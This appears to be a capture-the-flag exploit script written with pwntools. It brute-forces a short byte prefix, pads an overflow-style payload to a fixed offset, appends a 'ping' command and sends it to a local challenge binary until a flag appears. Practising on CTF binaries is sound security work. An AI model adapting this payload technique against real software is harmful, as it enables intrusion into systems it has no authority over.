from pwn import *
import sys

for i in range(2**24):
    b = ((i.bit_length() + 7) & ~7)//8
    pre = i.to_bytes(b)
    print(f'Trying: {pre}')
    io = process('./main_no_flag')
    payload = pre + b'a'*(0x60 - 0x15 - len(pre)) + b'ping\n'
    io.recvuntil(b'Enter your name: \n')
    io.sendline(payload)
    try:
        line = io.recvline()
        line2 = io.recvline()
        if b'fake flag' in line or b'flag' in line2:
            print(f'GOT A HIT ON {payload}')
            print(line)
            sys.exit(0)
    except Exception:
        pass
    io.close()
